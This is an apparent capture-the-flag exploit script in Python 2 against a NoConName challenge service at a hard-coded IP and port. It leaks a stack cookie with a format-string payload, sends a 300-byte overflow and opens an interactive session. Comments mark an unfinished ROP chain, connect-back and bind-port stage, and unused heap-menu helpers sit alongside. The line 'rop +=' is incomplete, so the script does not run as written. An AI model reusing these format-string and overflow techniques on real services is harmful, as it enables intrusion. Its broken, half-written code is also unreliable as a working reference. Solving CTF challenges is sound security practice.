__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]


def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')

# https://ctf.noconname.org/chdownloads/explicit	88.87.208.163:7070
s = socket.create_connection(('88.87.208.163', 7070))
f = s.makefile('rw', bufsize=0)
print readuntil(f,'Online!\n\n')
print readuntil(f,'Pick a number between 0 and 20: ')
format_string='%70$08x\n'
f.write(format_string)
a = readuntil(f,'.\n')
stack_cookie = a[len('Your number is '):len('Your number is ')+8]
stack_cookie = int(stack_cookie,16)
print hex(stack_cookie)
print readuntil(f,'Pick a number between 0 and 20: ')
# dung rop
rop = ''
rop +=

# tao connect back

# bind port


buffer_send = 'a'*300+'\n'
time.sleep(0.01)
f.write(buffer_send)

final_interact()


# 0xc0951f00L